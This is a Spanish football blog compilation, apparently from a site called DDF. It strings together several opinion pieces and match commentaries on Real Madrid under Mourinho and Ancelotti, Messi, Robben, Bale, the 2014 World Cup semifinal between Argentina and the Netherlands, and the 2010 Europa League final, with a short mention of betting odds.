resolviendo.Lo mejor: La sufridísima salvación, sin duda. La segunda juventud del meta Esteban, quien ya ha anunciado su regreso al Real Oviedo.Lo peor: Al menos desde fuera se percibe una cierta sensación de intranquilidad de la grada en torno a la figura del técnico. En lo individual, quizá se esperaba más del joven Suso (cedido por el Liverpool). Lo que espera: Probablemente otro año de sufrimiento y agonía, con una plantilla nuevamente confeccionada a base de modestos retales y de piezas obtenidas en los caladeros de Segunda. Eso sí, nuevamente en Primera. La escenografía no podía resultar más apropiada. Los unos, holandeses, vistiendo su clásica camiseta anaranjada y pantalón blanco. Los otros, enfundada la albiceleste, quizá más ceñida al pecho que nunca, y luciendo la calzona negra. En estos tiempos modernos, en estos tiempos de aberraciones cromáticas y de ruptura estilística con el fútbol de antaño, algo tan aparentemente simple como la elección de unos colores parecía resultar circunstancia vital. Fue verlos saltar a todos al césped de Sao Paulo uniformados como tradicionalmente procede y recibir en las papilas gustativas el primer golpe de sabor a partido clásico de verdad. A semifinal de Campeonato del Mundo.Puede que el empeño futbolístico de argentinos y holandeses no haya sido el más osado de todos en esta trayectoria mundialista. Dos equipos, ambos, gobernados por dos técnicos que cada día que ha pasado se han descubierto más pragmáticos, más de vencer los partidos por pequeños detalles que por puro empuje y decisión. Pero les ha bastado para alcanzar el penúltimo peldaño, todo a base de dominar el detalle para perderse en el conjunto. Tanto los de Sabella como los de van Gaal se preocuparon más, y así ocurrió anoche como vino ocurriendo a lo largo de todo el torneo, de tener controlado el desenlace antes de controlar los medios para llegar a él. La declaración de intenciones venía ya firmada desde el túnel de vestuarios.Al menos, para acabar triunfando, no quizá para desarrollar un partido impecable atendiendo a la ortodoxia del -por otro lado magnífico- Zonal Marking y sus epígonos.Viene esto a colación de la convocatoria de Del Bosque, y de una de las características que más le describen como entrenador: el conservadurismo. Don Pantuflo tiene una idea, la analiza, la aplica, y a menos que la realidad le contradiga hasta extremo impensable, persevera en ella hasta el final. Lo hizo con Flavio Conceiçao en el Madrid de 2003, lo hizo con McManaman en los grandes partidos del equipo blanco, mantuvo a un Torres de palo hasta semifinales del Mundial, ha aguantado millones de críticas con el doble pivote, y ahora ha preferido llamar a su gente para jugársela que a futbolistas “nuevos” que durante la temporada habían acumulado más méritos que los presentes. Desde este prisma, y no otro, hay que entender a los 23 tipos que van a portar la estrella en Polonia-Ucrania, y la dupla Xabi-Busquets, que horroriza por doquier. No sabemos si las decisiones serán correctas o no, pero sí es comprensible que Del Bosque persista en su planteamiento, visto adonde ha llegado con él en estos años. Si funciona, mejor no quebrar la línea.Pegarse y respetarse. Un runrún de inquietud acecha a la selección estos días, y alude a las rencillas entre futbolistas. Los teóricos de la mala sangre relatan demasiados enfrentamientos entre la tribu central y la catalana, demasiada mala palabra y demasiadas cuentas pendientes, que según los agoreros podrían afectar a una selección que parece que hay que presentar obligatoriamente como el meollo del buen rollo (Serrat dixit). Hasta citan a Vicente, “si no se llevan bien, que se lleven” como profeta del cataclismo.La realidad es que pocos han sido los grandes equipos donde dos de sus mejores jugadores no se hubieran partido la cara con gusto en un momento dado. El único saludo que le enviaba Míchel a Hugo Sánchez tenía forma esférica y llegaba siempre, en oblicuo, desde la banda derecha; corre un rumor infundado por Paterna de que Djukic y Cañizares se dieron una vez los buenos días; y Robben todavía está en tratamiento por el bofetón que le regaló Ribéry. Esto es fútbol, señores, no bridge entre solteronas de Oxfordshire. Si Piqué y Ramos tienen que darse de navajazos según pite el árbitro, aquí hay uno que si hace falta afila la albaceteña. Pero en el campo, rendirán como los campeones que son. La duda ofende.No hay dos sin tres. O eso nos gustaría, claro. Es tan espectacular la dimensión ganadora que ha alcanzado esta Roja en breve lapso, que en cuatro años España ha pasado de ser la Colombia de Europa a enfrentarse a un desafío tan extraño como fascinante: el triplete Eurocopa-Mundial-Eurocopa. Lo hubiera conseguido Alemania en el 76 de no ser por un tal Panenka, y se quedó demasiado lejos la Francia de los hombres de Harrelson en 2002, casi humillada por Senegal y Dinamarca. Fueron equipos maravillosos, legendarios, únicos. Esta Roja está con ellos, y al alcance un premio realmente muy serio: coronarse los mejores según un criterio objetivo lógico. Que así sea.Alineación probable: Casillas; Alba, Piqué, Ramos, Arbeloa; Busquets, Xabi, Xavi, Iniesta, Silva; Torres.Pronóstico DDF: Nos gustaría decir campeón, pero quizá resultase demasiado aventurado. Todo lo que no sean semifinales sería una sorpresa, aunque ojo a un cruce con Inglaterra (no hablemos de Francia) en cuartos. A partir de ahí, quién sabe, aunque si algo han demostrado estos jugadores es que compiten como nadie a ese nivel. Así que sí, nos arriesgamos: por lo menos, finalistas. Si algo llama la atención rápidamente a cualquier aficionado en cuanto mira los resultados, es una goleada. Si además en la goleada hay cifras dobles, las pupilas se dilatan. Y finalmente, si quien recibe el varapalo es todo un campeón de Europa, la noticia recorre el continente a la velocidad del guepardo. Un emergente PSV, repleto de jugadores interesantes como Toivonen, Afellay o Dzusdzák, ha concretado los años de decadencia del Feyenoord en un titular inolvidable que sus seguidores llevarán clavado desde hoy y para siempre: 10-0. Una defensa de barraca de feria que ha permitido ocho tantos en el segundo tiempo se ha combinado con el hambre de un grupo de jóvenes que ha visto –un domingo cualquiera- la ocasión de hacer historia, y de la amalgama ha salido un trueno que marcará una fecha con letras de fuego en el fútbol holandés, y en la historia de los contendientes. Qué lejos queda aquel día de 1970 en Milán… Seguramente sería el ínclito Florentino Pérez el último que hubiera imaginado, hace un año escaso –mucho menos diez años, cuando asumió por primera vez el amo de la nave blanca- que el futuro del club que dirige y probablemente el suyo como presidente se vería unido de forma tan indisoluble como peligrosa a las prestaciones y el desempeño de un entrenador. El Ser Superior, que siempre mostró con hechos su desprecio por los inquilinos del banquillo y que ha resultado un arma de destrucción masiva de técnicos comparable al más desatado Jesús Gil, se ha encomendado al taumaturgo más acreditado del fútbol europeo. No importa haber presentado un proyecto electoral que incluía perfiles diametralmente opuestos, ni haber pasado por encima del maltratado Pellegrini –récord de puntos en Liga y siempre respetado por el Bernabéu, a pesar de las indacencias-, ni mucho menos que en el club haya un director técnico para quien Mourinho, durante años, fue simplemente el Demonio. Da igual, casos desesperados requieren medidas desesperadas.Y es que, desde el punto de vista de la grandeza que siempre lo ha caracterizado, el Madrid actual es un prototipo de Dire Straits, situación límite. El club viene de dos años sin ganar ni un mal título; los sucesivos fracasos en Europa lo han llevado al segundo bombo, y el prestigio continental se escapa a chorros por la herida que han ido abriendo Liverpool, Roma o Lyon; se ha convertido en un club antipático, una especie de Inter de los noventa abonado al derroche y siempre presto al exhibicionismo y a la ampulosidad; su cantera, antes orgullo de la afición, es un erial donde desaprensivos tipo Ramón Martínez conservan mando en plaza; el nivel medio de la plantilla, con honrosas excepciones, es discreto, mientras antiguos jugadores triunfan en el exterior y sus estrellas históricas salen por la puerta de atrás; no hace mucho que en la parte noble habitaba un nido de corrupción; y un sinfín de personajes y organizaciones, más que nunca, alargan su mano para tratar de obtener algo del mayor generador de actualidad de este país. Por si fuera poco, la crisis viene acompañada –y en parte provocada- por el excepcional momento histórico del Barcelona, referencia mundial en la actualidad a nivel deportivo y también modelo de muchas cosas en las que el Madrid lleva años fallando. Un lastre inmenso.Revertir tan dantesca situación es una labor titánica para toda una institución, no digamos para un solo hombre. Sin embargo, si una persona puede salir triunfante de un tamaño desafío, ese es sin duda Jose Mourinho. Sólo él puede presentar el aval de haber triunfado plenamente en tres proyectos tan diferentes como los que dirigió en Oporto, Londres y Milán, controlando, desde un personalísimo modo de entender el puesto, plantillas de perfil alto y bajo, todo tipo de sistemas de juego e idiosincrasias tanto balompédicas como periodísticas, y a la vez soportando todos los ataques que se han derivado de su fuerte y particular personalidad. No será diferente en Madrid, donde deberá sobrellevar una etiqueta de defensivo que no ha merecido más que en momentos puntuales, la inquina de cierto tipo prensa y afición para la cual sólo hay una forma correcta de jugar al fútbol, un tendido siete, a menudo mediatizado, que llena el Bernabéu de música de viento a las primeras de cambio, y las carencias de una plantilla que ofrece un aspecto en general fiable, pero no deslumbrante.Porque si es verdad que han llegado refuerzos, también lo es que ninguno de los nombres que han posado este verano con la camiseta blanca suscita temblor inmediato en los rivales. No aterrorizan ni Özil, brillante pero intermitente en el Mundial; ni Di María, fichado para abrir el campo y aún por acreditar en un equipo de exigencia máxima; ni Pedro León o Canales, aún por foguear al máximo nivel; ni mucho menos Carvalho o Khedira, fichajes cuya idoneidad puede ser incluso cuestionada. Jugadores en general jóvenes –punto a favor- que pueden salir buenos o incluso muy buenos, pero que es difícil que ofrezcan rendimiento máximo e inmediato. En realidad, si hay que personalizar, la temporada del Madrid va a depender muchísimo de que Cristiano Ronaldo e Higuaín den un paso adelante en los partidos clave en los que hasta ahora han pasado más desapercibidos de lo deseable, y de que Benzema afile el colmillo y consiga por fin sacar el gran delantero que muchos aún creemos que lleva dentro.Estos son los mimbres de los que dispone Mourinho para llevar a cabo su milagro. Enfrente están las limitaciones, la deriva del club, los enemigos personales,  la grandeza del actual Barcelona… Sin embargo, la capacidad de The Special One es tan grande que pocos se atreverían a apostar contra él, sobre todo si por una vez, los poderes fácticos que dirigen al Madrid y de los cuales es víctima el club blanco más que ninguno en Europa le otorgan el don que no han concedido a nadie en los últimos años: la paciencia. Lo mejor: que Mourinho es capaz de cualquier cosa.Lo peor: la enorme desventaja con la que parte el club con respecto a su máximo rival, y la impaciencia del entorno.Pronóstico DDF: subcampeón. Puede tratarse, quizá junto al penalty de la final de 1990, de la jugada más polémica de la historia del fútbol. El balón de Hurst que botó bajo los palos de Tilkowski es casi seguro que no entró, pero tanto el árbitro Dienst como su linier Bakhranow dieron por bueno que sí lo hizo y concedieron el gol que abrió de par en par a Inglaterra las puertas de “su” Mundial. Se abría así una cadena de enfrentamientos entre ingleses y teutones que ha constituido una de las pugnas más apasionantes de la historia del torneo, y se acuñaba por primera vez el concepto de gol fantasma, que ha pasado a convertirse en folklore del fútbol. Nosotros, al menos, nos alegramos por el hombre del que partió el balón. El Madrid ha vencido hoy por 2-0 al Milan, en lo que puede considerarse su primera victoria ante un grande de Europa desde que hace más de dos años el Barcelona le hiciera el pasillo. Además, si una palabra describe su triunfo de hoy ha sido la suficiencia. Logrados los dos tantos (Ronaldo y un fantástico Özil) en el primer cuarto de hora, un Madrid casi siempre dominador, dinámico y presionante en ocasiones, relajado y tranquilo, con cuajo, en otras, ha sometido sin grandes problemas a un rival trufado de jugadores de pasado tan glorioso como breve porvenir en el mundo del fútbol. No es de recibo que el centro del campo de un equipo de teórico máximo nivel europeo lo formen tres viejas glorias como Gattuso, Seedorf -que se marchó ovacionado- y Pirlo, o que Ronaldinho reproduzca una y otra vez en en slow motion los movimientos que lo hicieron tan grande, y que tanta pena dan ahora. Muy individualista Di María y obtuso Higuaín en la noche de hoy, le han bastado al equipo merengue la seguridad de un gran Carvalho, la claridad de Xabi en el medio, el empuje de Khedira, las diabluras de un Özil que siempre ofrece algo diferente, y la omnipresencia de Cristiano Ronaldo, cerca de su mejor versión. El proyecto de Mourinho sigue su curso, con el equipo aún imbatido, creciendo a ojos vistas, negando su pretendida fama de amarrategui y ganando apoyos para una carrera que se presume larga. De momento, los únicos silbidos que se han oído hoy en el Bernabéu han sido para Ronaldinho, Ibra y Robinho, recibido este último como el enemigo público número uno. Para los locales, aplausos y parabienes. Retrocedamos por un momento a hace seis años, verano de 2006.Dos jugadores de corte similar debutan en un Mundial. Ambos son algo contrahechos, endiabladamente rápidos, y muy, muy jóvenes. Los dos juegan en grandes clubes, que tienen puestas enormes esperanzas en su futuro, así como sus selecciones. Arjen Robben es algo mayor, tiene 22 años y el gran Chelsea de Abramovich ha lanzado sus redes sobre él; Leo Messi aún no ha cumplido los 20 y apenas ha firmado treinta partidos con el Barcelona que acaba de ganar su segunda Copa de Europa; el mejor, precisamente contra los blues. Y una cosa más en la que se parecen: los dos traen de fábrica la suerte más difícil de encontrar en el fútbol, el arte de eliminar contrarios con un quiebro incontrolable. Un regate, regalo del de arriba, que sigue constituyendo el terror de sus rivales un lustre más tarde.Todos sabemos en lo que se ha convertido Messi por obra y gracia de Guardiola; ahora mismo es algo muy parecido al jugador total, pues a su don natural ha añadido una capacidad goleadora, una versatilidad en el remate, un perfección en el pase y, sobre todo, un entendimiento del juego que le han convertido en el mejor jugador del mundo. Si el Leo de 2006 era un sensacional solista que rompía bastantes partidos a base de diagonales -en un equipo donde las estrellas eran otros-, la versión actual los gana uno tras otro con la aquiescencia y la dedicación de un estupendo puñado de futbolistas que juegan para él.En cambio, Robben da toda la impresión de ser exactamente el mismo jugador que era cuando empezamos a conocerlo. El regate sigue siendo el mismo, quizá ha perfeccionado algo su jugada prototípica de entrada en el área y tremendo zurdazo, pero más allá de ello, apenas ha añadido nada a su juego. Sea por la sucesión constante de lesiones, sea por incapacidad o desinterés de sus entrenadores –Schuster o Heynckes no han destacado nunca como formadores, y Van Gaal sólo quería un extremo puro en su posición- no se puede hablar de ningún tipo de progresión para la que fue una de las mayores joyas del fútbol europeo, y que ya ha cumplido 28 años sin ningún título relevante a nivel internacional -aunque todos sepamos, demasiado bien, que lo tuvo en sus botas-. En cualquier caso, hará bien esta noche el Real Madrid en no perder de vista al menudo jugador holandés. Tiene pocas cosas, pero las que tiene revientan partidos, y lo mejor del equipo blanco no es la capacidad defensiva de sus laterales zurdos. Además, querrá demostrar que su salida de Chamartín fue un grave error del club español. Algo que piensa mucha gente, porque con todos sus defectos, un extremo punzante es siempre un tesoro. Y el Bayern no tiene uno, sino dos. Así que ojo. “…miró al soslayo, fuese y no hubo nada”. Así acaba el famoso soneto de Cervantes al túmulo de Felipe II, y así termina el sainete que ha montado la LFP en las últimas fechas, después de que la juez Pujol haya estimado la demanda de los clubes que disentían del cierre patronal. La magistrada ha anulado el acuerdo que establecía la suspensión de la siguiente jornada,  considerando más razonable la no alteración del statu quo –el calendario aprobado por la Federación- que dicha suspensión. De este modo, se llega a la que probablemente sea la mejor solución para todos: la competición sigue su curso normal, la LFP ha logrado el ruido que deseaba para hacerse escuchar, y su imagen, aunque dañada, no lo queda tanto como lo hubiera sido tras el paro. En cualquier caso, habrá que estar atentos a la próxima astracanada de Astiazarán, Tebas y compañía. No tardará mucho. Resulta difícil escribir con ecuanimidad estos días de hipérbole sobre el expreso de Cardiff. No puede negarse que el revuelo es merecido, primero por la entidad aislada del golazo de Mestalla -lo de salir del carril, entrar y adelantar, ya por vocabulario, parece de motorismo más que de fútbol- y luego por ser el gol partita cuando muere una final con el Barcelona, que no es lo mismo que marcarlo en semifinales del Carranza. Bale ha dejado su impronta en uno de esos momentos en que los cracks deben demostrar tal condición, y está claro que desde el miércoles pasado los noventa kilos pesan bastante menos.Sin embargo, el excepcional tanto que valió un título y el peculiar rendimiento del galés durante el año no han cambiado mi percepción original de que se trató de un fichaje innecesario para el Real Madrid, y de que ha sido infrautilizado durante toda la temporada. Más precisamente: se trató de un fichaje innecesario porque necesariamente habría de ser infrautilizado durante todo el año. Es un asunto debatible, y muy respetable pensar que si un jugador del calibre de Bale se pone a tiro hay que ficharlo sí o sí, pero cuando uno se gasta ese pastizal debe pensarse muy bien lo que se hace antes de ejecutar la operación, sobre todo si es con dinero ajeno. Y lo que hizo Florentino Pérez fue traer un jugador que se había convertido en estrella jugando en el puesto del jugador franquicia del Real Madrid, Cristiano Ronaldo; el único jugador de la plantilla, probablemente que se ha ganado durante estos años el derecho a jugar donde desee. En este caso, de delantero partiendo del interior izquierdo.Como es conocido, Ancelotti decidió dar carrete a Bale por la zona derecha del ataque blanco, justificando su decisión en que de este modo el galés podría penetrar en diagonal para disparar con su espectacular pierna izquierda. Se trata de un argumento, sin duda alguna, pero lo que es menos dudoso es que al futbolista se le ha visto incómodo durante toda la temporada en una posición que no es la suya. Gareth es un zurdo muy zurdo, y aunque posee un instinto natural para acudir a posiciones de remate, igual que el portugués, es más hombre de banda, y sufre mucho más para controlar, trasladar y mover la pelota con su pierna mala de lo que le cuesta a Cristiano hacer lo propio con la suya. Esta incomodidad la ha transmitido en muchos partidos esta temporada, en los que ha dado la impresión de pasarse minutos y minutos desconectado del juego colectivo que trataban de elaborar el resto de sus compañeros, y también dar lugar a ciertos rumores de favoritismo en el momento de la temporada en que Jesé jugó algunos partidos en su posición y dio la impresión de introducirse mejor en el engranaje colectivo sin que, sin embargo, se resintiera la producción de goles y asistencias.Este último punto, por cierto, es usado con razón por los defensores de la aportación de Bale al equipo, y desde luego los números en las suertes más importantes del fútbol avalan al futbolista británico. Sin embargo, es probable que las cifras goleadores de Bale no dependan tanto de la posición que ocupa en el campo, sino de que es un jugador al que, dadas sus características, se le acaban cayendo los goles de los bolsillos: su disparo, desde cualquier posición, es un arma de destrucción masiva, y su inmenso poderío físico le permite llegar a posiciones de goleador varias veces por partido, partiendo prácticamente de cualquier lugar. Con esto en la cabeza, sería interesante buscar un lugar del campo donde Bale pueda encontrarse más cómodo de lo que se encuentra como teórico extremo derecho en un 4-3-3, teniendo en cuenta -sobre todo con vistas al partido de hoy- que Cristiano volverá a su lugar, y que el Madrid va a tener que enfrentarse a un Bayern en el que Guardiola cargará el campo de centrocampistas. No debe olvidarse lo que ocurrió en Dortmund, con Xabi y Modric ahogados en un mar de camisetas amarillas, ni que el Pep del Barça castigó repetidamente las versiones del equipo blanco que viraban con demasiada frecuencia a ese 4-2-4 que en el fútbol moderno suele resultar tan indeseable como inviable. Del segundo tiempo de Dortmund y de la final de Copa hay también que destacar cómo mejoró el Madrid en control del partida con la presencia de un cuarto centrocampista, que  además en este caso es un jugador de la clase y el empaque de Isco Alarcón. Cuesta imaginar el partido de mañana sin su presencia.Teniendo todo esto en cuenta, es difícil preguntarse por qué no se considera en ningún momento la opción de Bale como lateral/carrilero por la banda izquierda. Habitualmente esta teoría es rebatida por argumentos del tipo “a uno que ha costado 90 kilos no lo puedes poner de lateral” o “Bale no aceptaría jugar en esa posición”. Bueno, supongamos que el entrenador del Madrid se guía por las motivaciones habituales de los entrenadores -colocar al jugador donde mejor sea para el equipo- y que el jugador acepta jugar donde le manden. Con Bale partiendo del lateral e Isco y Di María como volantes en un 4-4-2, el Madrid tendría los cuatro medios más el propio galés sumándose con frecuencia al medio desde una posición que conoce muy bien, por cuanto que ha jugado muchos partidos en ella. Puede ser que sus cifras goleadoras se resintiesen un poco, pero es probable que el beneficio colectivo compensase sobradamente este hándicap. Además, el Madrid defendería con nueve cuando pierde el balón, en lugar de con ocho como ocurre en la actualidad, y especialmente para un evento como estas semifinales, podría pelear la batalla en el medio, que es donde suelen decidirse enfrentamientos de este calibre.En cualquier caso, y tal y como reza el título del artículo, nada de esto ocurrirá. Si Cristiano y Bale están sanos (algo que cuando se escribe este artículo no está completamente claro) Ancelotti saldrá con sus 4-3-3 habitual, y veremos a Xabi, Modric y Di María -la hora escasa que le aguanta su físico ante esta exigencia- rodeados de camisetas rojas la mayor parte del tiempo, con los atacantes del Madrid recibiendo mucho menos balón del que podrían recibir en otras condiciones. A partir de ahí, que ocurra lo que tenga que ocurrir. Aquel famoso gol de Roberto Carlos en Tenerife parecía tan singular, tan único, y a la vez tan propio de un jugador que nunca admitrá copia, que parecía difícil que pudiera aparecer alguna vez un clon. Pero son muchos partidos, muchas ligas, muchas temporadas. Y si apareció un tipo que fue capaz de volver a llenar el barrilete cósmico, si alguien volvió a volar como Cruyff, y si son legión ya los imitadores de Panenka, ¿cómo no iba a llegar otra conversión de la línea recta entre el córner y la portería en autopista de potencia supersónica? Ante ustedes Kafoumba Coulibaly.El nuevo traje estará listo en unos días. Hasta entonces os pedimos paciencia ante cualquier posible eventualidad y por supuesto, nos encantaría saber lo que  opináis sobre estas mejoras una vez estén operativas.Repetimos, nuestro objetivo es seguir mejorando y nuestro mayor aliento saber que  estáis ahí. Por ello, por agradecimiento a vosotros, a esa auténtica comunidad de aficionados al fútbol que creemos haber articulado en torno al blog, seguimos con las  mismas ganas e ilusión que el primer día. Con un nuevo aspecto pero hay DDF para rato. Una vez más, y de la mano de Betfair.com, os  ofreceremos el análisis de los partidos más interesantes del fútbol  europeo, con una especial atención a todos aquellos que os manejáis en  el mundo de las apuestas on-line. Schwarzer, Paintsil, Brede Hangeland, Hughes y Konchesky, Danny Murphy, Etuhu, Dempsey, Damien Duff y Zoltan Gera, Bobby Zamora, De Gea, Ujfalusi, Luis Amaranto Perea, Domínguez y Antonio López, José Antonio Reyes, Assunçao, Raúl  García y Simao Sabrosa, Forlán y Sergio, el Kun, Agüero son los hombres que no deberían estar aquí. Como los doce del patíbulo de Robert Aldrich, todos y cada uno de los que que han llegado al final de esta misión fueron escoria al principio de la misma y todos y cada uno de ellos serán recordados cuando acabe. Unos pocos engrosarán los listados del oropel uefo pero todos permanecerán durante años en la memoria de su gente. Por su parte, Roy Hodgson y Quique Flores mutarán en Reisman para el asalto al coliseo hanseático, al Volksparkstadion, donde a sus hombres, al Atlético de Madrid y al Fulham les aguarda un jugoso premio. Es la final de la UEFA Europa League.El Atlético de Madrid quiere regresar de la operación con un título en el petate. Sería, ahí es nada, el primero en Europa desde la añorada Recopa del 62 que lograron arrebatar a la Fiorentina de Valcareggi. En aquella ocasión se necesitó disputar, educadísima costumbre enterrada entre fechas de calendario, un partido de desempate tras la igualada a un tanto en Hampdem Park y el escenario escogido para desnivelar la contienda fue el Neckarstadion de Stuttgart. Estoy seguro de que Enrique Collar, leyenda viva de la entidad colchonera, capitán al mando entonces y comentarista en la retransmisión que hoy nos brindará Telecinco, estará encantado de tener que jugarse las castañas en Alemania. Y es que, como dicen los argentinos, y quizá el Atleti sea el más argentino de los clubes españoles, nunca hay que subestimar la influencia de la cábala.Los parroquianos del Fulham podrán contar que debutaron en una final continental al mismo tiempo en que nacía la nueva Copa UEFA. Y también que absolutamente nadie les esperaba en el evento. Como se ha encargado de recordar Danny Murphy, al que el fútbol le ha brindado la oportunidad de levantar otra Copa de la UEFA casi diez años de aquella agónica victoria del Liverpool ante el Alavés, el once cottager ha desafiado a la lógica. Por jugadores como él, hoy capitán, el otrora apestado Bobby Zamora (es duda pero jugará), los talentosos Dempsey y Zoltan Gera o ese delicioso proyecto de figura que nunca lo será llamado Damien Duff yo también seré hoy un poco del Fulham. “Hemos pasado eliminatorias durísimas donde el equipo ha demostrado su  coraje ante la dificultad” dice Quique. “Hemos tenido unos cruces más difíciles en esta competición” replica Hodgson. Y razón no les falta a ninguno de los dos técnicos. Si a Atleti y Fulham han llegado a la gran cita ha sido, y permítanme que el casticismo acuda a mi auxilio pese a mi origen norteño, dándose mucho puñal. Trabajando mucho, sacando provecho de sus escasas virtudes, superando socavones de juego, emparejamientos fastidiados y en el caso de los rojiblancos, reconstruyendo el funcionamiento del equipo sobre la marcha. Los finalistas siempre son justos merecedores de la ocasión pero uno tiene la sensación de que, en éste caso, mucho más. Poco más que añadir, suerte y disfruten.La victoria del Atlético, favorito para muchos apostantes en la final, se cotiza en Betfair.com  a 2,18 por euro apostado. La del Fulham a 3,85  y el empate a 3,45 por  euro. Y para terminar, una curiosidad para mitómanos: un gol de Antonio López, capitán colchonero, se paga a 14,5 por euro apostado.Nadie lo sabía, pero Sabella y van Gaal se encontraron antes de saltar al césped. Pidieron prestado papel y boli y allí, malamente apoyados sobre el reluciente alicatado de las entrañas del Arena Corinthians, estamparon sus rúbricas al pie del documento que formalizaba el pacto de no agresión. No habría bajas. Ni siquiera heridos.Y a uno, que venía de ‘perder’ media tarde asistiendo ensimismado a la locura de Nibali, Sagan, Boom y Cancellara sobre el indomable pavés del norte de Francia y que llegaba a la cita mundialista del día con las expectativas de espectáculo deportivo disparadas, aquel armisticio descarado le supo a traición al momento, a escupitajo despectivo sobre la historia de la competición. Bien es cierto que llegados a estas alturas en las que la gloria casi se roza con la punta de los dedos mientras el abismo amenaza a escasos centímetros del pie, la tendencia natural es la de minimizar los posibles riesgos, la de alejarse prudentemente del precipicio a costa de encoger un poco el brazo en ese intento por asir el trofeo. Pero a la segunda semifinal de Brasil 2014 solo la salvó precisamente eso, ser una semifinal.Ni siquiera la tanda de penaltis que designó finalista respondió a los cánones habituales de una épica tanda en semifinales. Esta vez van Gaal, vaya usted a saber por qué, no quiso jugarse la partida sacando la carta mágica. Creyó que con la entrada de Huntelaar le bastaría para salir victorioso, lo que traducido supone que se decidió por fin a atacar en lugar de protegerse. Sin posibilidad de introducir a Tim Krul, tuvo que confiar en un portero en el que ya había dejado sobradamente claro días atrás que no confiaba para la suerte de los penaltis. Jasper Cillessen se presentó allí donde conceden vitolas de héroe al primero que pase y haga un mínimo merecimiento, pero lo hizo asustado, tembloroso, convencido de su estadística incapacidad para atajar balones pateados desde los once metros. Su simple estampa bajo palos había concedido la primera, y tal vez definitiva, ventaja a Argentina, finalista veinticuatro años después. El resto del trabajo fue cosa de Sergio Romero, repudiado por muchos cuando fue incluido en la lista de Sabella y alzado anoche al Olimpo como héroe nacional tras detener los golpeos de Vlaar y Sneijder. El Goycoechea de las nuevas generaciones. El único que quiso permanecer fiel a la idea de partido clásico de verdad. Corría el minuto treinta y tantos de la primera mitad. Cómodo como pocos en el intercambio de golpes, el Real Madrid había conseguido remontar el tanto inicial de Iniesta, y su disposición era la de no poner freno a su voracidad, la de seguir acrecentando la diferencia en el marcador que en ese momento era de un único tanto.Parece ser que anoche la emisión de The Damned United alcanzó un 1,6 de share en la 2, una cifra no especialmente llamativa. Sin embargo, esta mañana nos hemos encontrado la sorpresa de que el título de la película era trending topic en Twitter en España. Algún avezado sociólogo podrá sacar sus conclusiones sobre la intersección entre los conjuntos de televidentes e internautas, pero nosotros nos quedamos con la impresión de que muchos de los que pasan un ratito a visitarnos en DDF tuvieron tiempo ayer tarde (o noche) para dedicarle una frase o dos o tres al entrenador más capacitado, bocazas, soberbio, polémico y genial que dio nunca la cuna del fútbol. Como de Cloughie ya se ha dicho prácticamente todo, os dejamos aquí un pequeño recuerdo de los angelitos con los que tuvo que lidiar el amigo durante esos 44 días que le marcaron a fuego las entrañas. Un documento de ocho minutos sobre una descomunal paliza al Southampton, con un caudal desbordante de fútbol en los siete primeros, y un epílogo para caracterizar con trazo firme la catadura moral de los Bremner, Lorimer y compañía. Pocos equipos han generado tanta admiración, y también tanto odio. Ambas cosas con razón. Hay una escena de Sin perdón que se queda clavada como una flecha en un costado. William Munny, el personaje que interpreta Clint Eastwood, es un viejo acabado que una vez fue un asesino despiadado y que ha acabado aceptando un trabajo miserable para poder sobrevivir. Munny se reformó, abandonó por amor su vida criminal, y dejó el alcohol que le había acompañado en tantas noches de sangre y muerte. Lo vemos durante casi toda la película cabizbajo, roto y enfermo, llevando a cabo una labor para la que ya no está preparado, y manteniendo a raya la pulsión violenta que lo convirtió en una leyenda negra. Hasta que se entera de que su mejor amigo, su único amigo, ha sido torturado hasta la muerte y su cuerpo colgado como ejemplo en el centro del pueblo. William no dice nada, sólo toma la botella de whisky y bebe. Bebe. Un trago que se hace eterno, porque todos sabemos lo que va a ocurrir a partir de ahí, y casi vemos ya los cadáveres balaceados desplomarse uno tras otro. Ha sido la señal.Anoche saltó Messi al Camp Nou después de dos meses lesionado. El devastador, el caníbal, el puto amo -como tituló un periódico de Barcelona- pisaba el césped por primera vez después de una lesión de cierta gravedad. En ese tiempo, y como el fútbol no tiene memoria, el foco se había desplazado a otro lado, y quien más quien menos pensaba que al rey le iba costar un tiempo recuperar su trono. Algo así pensamos todos cuando vimos los primeros minutos de Leo en el campo, caminando con parsimonia, tocando el balón en desplazamientos de dos o tres metros, y probando unas piernas que llevan tiempo jugándole malas pasadas. Hasta que le llegó un balón en la línea de tres cuartos, y se lanzó a un eslalom diagonal vertiginoso, esquivando un par de contrarios y dando una sensación de plenitud y fuerza que pareció, por un momento, levantarse una estela de fuego tras él. Una acción que acabó en nada, irrelevante en el contexto del partido, sin mayor importancia. Como un trago de whisky. Como una señal.Lo que vio el coliseo blaugrana en los últimos minutos del partido no desmereció en nada lo que acabó ocurriendo en el vetusto y maloliente salón de Big Whiskey. Lionel Munny cogió su fusil, apuntó y destruyó en un rato inolvidable a la pobre defensa del Getafe, que le había sufrido como nadie en otras épocas. No sólo que marcó dos goles, completamente distintos y, a la vez, tan propios de él, sino que volvió a dar una vez más la sensación de una fuerza de la naturaleza, el caudal irreprimible de fútbol superior que arrasa a cualquier enemigo, en cualquier campo y en cualquier cualquier circunstancia. El jugador gigantesco, incomparable con nadie, ni vivo ni muerto. El jinete pálido.Miro en Google. Veo que juega en el AJ Ajaccio francés. Me da pereza saber si es titular y marca. Miro el resto de la plantilla del equipo. Encuentro al portero Ochoa y a Pedretti. Creo recordar a Pedretti en un Madrid-Auxerre de Champions que vi en el Bernabéu. Un enano talentoso. Acababa de romper una relación de ocho años, me acababa de hacer mi primer tatuaje y después quedé con Sergio Cortina para emborracharme. Vuelvo a Rumania. “¿Es bueno el Marica?” , me pregunta Alexandru sonriendo.Lo acaba de fichar el Getafe. “¿Getafe es un equipo?” . Sí, le contesto y ahora soy yo el que sonríe. Es como un pueblo de Madrid, lleva unos años en Primera División. Pero va poca gente al estadio. Visten de azul. Una vez llegaron lejos en Europa y en él juegan muchos jugadores canteranos del Madrid. No sé qué más explicarle del Getafe. Me gusta Marica –o Chiprian-, lo vi jugar en el Steaua de Bucarest en Europa. Contra el Sevilla, creo. Desde luego contra el Madrid. Lo digo todo de memoria. Me cansé de mirar la Wikipedia. (Debería haberlo hecho, me corrige Alex B. en los comentarios con razón. Me debí de confundir con Nicolita, vete tú a saber por qué. Marica nunca jugó en el Steaua. Voy a pagar la aportación que me pide el de Wikipedia para intentar redimir mi error). Y aprovecho que Alex no sabe nada de fútbol. Podría decirle que Messi jugó en el Cádiz al principio de llegar a España y se lo creería. Estoy tentado de decirle que Cristiano despuntó en el MFK Kosice antes de ir al Manchester, que Benzema no juega con Francia sino con Argelia por motivos sentimentales y que el mejor equipo de Alemania es el Sporting Muniqués.Espero que juguéis el 